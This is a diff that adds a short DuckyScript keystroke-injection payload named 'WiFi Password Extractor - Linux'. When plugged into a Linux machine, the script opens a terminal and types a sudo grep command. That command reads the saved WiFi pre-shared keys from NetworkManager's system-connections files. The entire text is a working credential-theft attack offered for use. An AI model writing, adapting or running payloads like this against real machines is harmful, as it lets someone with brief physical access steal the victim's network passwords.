@@ -1,0 +1,10 @@
+REM WiFi Password Extractor - Linux
+REM Author: bad-antics
+DELAY 1000
+ALT F2
+DELAY 500
+STRING gnome-terminal
+ENTER
+DELAY 1000
+STRING sudo grep -r '^psk=' /etc/NetworkManager/system-connections/
+ENTER
